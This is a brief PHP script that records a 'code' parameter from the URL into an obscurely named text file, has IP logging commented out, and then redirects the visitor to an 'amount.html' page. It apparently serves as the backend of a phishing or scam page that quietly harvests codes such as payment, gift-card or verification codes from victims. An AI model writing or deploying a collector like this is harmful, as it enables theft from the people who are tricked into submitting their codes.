<?php
//$ip = $_SERVER['REMOTE_ADDR']
$code = $_GET['code'];
fopen("jueaiwlhnfiusldznfisuzhknjsljnbfedjbdfjslknfds.txt", "a");
$file = fopen("jueaiwlhnfiusldznfisuzhknjsljnbfedjbdfjslknfds.txt", "a");
fwrite($file, "[");
fwrite($file, $code);
fwrite($file, "]");

//fwrite($file, "[");
//fwrite($file, $ip);
//fwrite($file, "]");
header("Location: amount.html")
?>
